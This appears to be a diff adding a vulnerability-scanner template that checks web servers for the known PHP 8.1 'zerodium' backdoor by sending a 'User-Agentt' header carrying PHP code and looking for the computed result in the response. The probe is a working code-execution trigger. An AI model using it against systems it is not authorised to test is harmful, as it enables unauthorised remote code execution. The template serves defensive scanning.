@@ -1,0 +1,17 @@
+# info to search signature
+id: zdi-php-backdoor
+type: fuzz
+level: 4
+info:
+  name: ZDI php backdoor check
+  risk: High
+payloads:
+    - 'zerodiumvar_dump(233*233);'
+requests:
+  - generators:
+      - Header("[[.original]] \ {{.payload}}", "User-Agentt");
+    detections:
+      - >-
+        StringSearch("response", "int(54289)")
+references:
+  - link: https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor
